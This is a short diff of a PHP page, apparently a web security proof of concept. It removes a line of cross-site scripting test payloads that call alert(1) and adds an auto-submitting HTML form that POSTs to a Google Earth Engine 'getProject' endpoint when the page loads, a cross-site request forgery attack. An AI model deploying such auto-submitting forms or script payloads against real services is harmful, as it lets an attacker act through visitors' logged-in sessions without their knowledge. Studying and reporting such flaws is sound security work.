@@ -1,2 +1,11 @@
 <?php header("Content-Type: text/html"); ?>
-<script>alert(1)</script></script><svg/onload=alert(1)><img src=x onerror=alert(1)>
+<?php header("Content-Type: application/json"); ?>
+    <form name="myform" action="https://explorer.earthengine.google.com/getProject" method="POST">
+      <input type="submit" value="Submit request" />
+    </form>
+
+
+
+<script type="text/javascript">
+    document.myform.submit();
+</script>
